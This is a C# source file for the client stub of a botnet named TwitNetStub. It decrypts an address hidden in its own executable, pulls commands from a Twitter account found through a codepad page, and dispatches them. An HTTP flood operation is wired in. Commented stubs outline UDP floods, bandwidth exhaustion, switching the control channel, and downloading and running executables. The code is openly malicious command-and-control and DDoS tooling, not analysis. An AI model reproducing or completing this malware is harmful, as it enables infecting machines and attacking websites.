/*
 * TODO:
 * - Timer for checking tweets
 * - Some way to make sure operations don't loop, like updating that only needs to be done once.
 * - Way more operations
 * - Store config as encrypted xml
 * - Write custom encryption algorithm
 */

using System.Text;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;
using TwitNetStub.Operations;
using TwitNetStub.Util.Encryption;
using TwitNetStub.Util.Misc;

namespace TwitNetStub
{
    public sealed class Main
    {

        #region Singleton
        static Main _instance;
        static readonly object PadLock = new object();

        public static Main Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _instance ?? (_instance = new Main());
                }
            }
        }
        #endregion

        public void Start()
        {
            //Grab file contents
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
            string appendData = Strings.Split(Encoding.Default.GetString(stub), Constants.Splitter)[1];

            //Do first decrypt with default key
            SimpleAES defaultAES = new SimpleAES();
            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
            appendData = defaultAES.DecryptString(appendData);

            //k so now you have (Encrypted url)|split|key
            string encryptedName = Strings.Split(appendData, Constants.Splitter)[0];
            Constants.CustomEncryptionKey = Strings.Split(appendData, Constants.Splitter)[1]; //Grab key
            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            string user = defaultAES.DecryptString(encryptedName);

            WebClient client = new WebClient();
            string codepad = client.DownloadString("http://" + user + ".codepad.org/");
            string twitUser = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();

            string tweet = Twitter.GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + twitUser + ".xml"));
            
            //these will throw a null pointed if you dont do <command> at <argument>
            //even if there are no arguments. ill fix it later...
            string command = Strings.Split(tweet, Constants.CommandSplitter)[0];
            string arg = Strings.Split(tweet, Constants.CommandSplitter)[1];

            IBotOperation op = null;
            switch(command.ToLower())
            {
                case "httpflood":
                    op = new HTTPFlood(arg);
                    break;
                case "bwrape":
                    //mass downloads a file to rape bandwidth on a website
                    //something like a large image.
                    //Arguments: URL
                    break;
                case "udpflood":
                    //floods udp protocol
                    //Arguments: URL
                    break;
                case "switch":
                    //allows you to switch control to another twitter
                    //or codepad page
                    //Arguments: URL
                    break;
                case "choniboi":
                    //will remove the bot from pc
                    //Arguments: None
                    break;
                case "visit":
                    //will visit a website once for traffic reasons
                    //Arguments: URL, Maybe an integer for how many visits
                    break;
                case "update":
                    //Will download an executable and run it
                    //Arguments: URL
                    break;
                case "thanks":
                    //By leaving this blank, the bot will go see "thanks"
                    //and stop whatever its doing. Any time you start an operation
                    //you will need to end it by saying "thanks"
                    //or else the bots will keep looping their operation every time
                    //it reads the tweet. this reminds me that we need to add some way to
                    //make sure to add some mechanism that checks if it has already completed
                    //an operation if it should only be done once like updating or visiting
                    //Arguments: None
                    break;
                default:
                    //If the command cant be identified, well then shit son.
                    return;
            }
            if (op == null) return;
            op.Initialize();
            //this will loop the operation until
            //finished is thrown up, so make sure you toss it
            while (!op.Finished)
            {
                op.Run();
            }
        }
    }
}
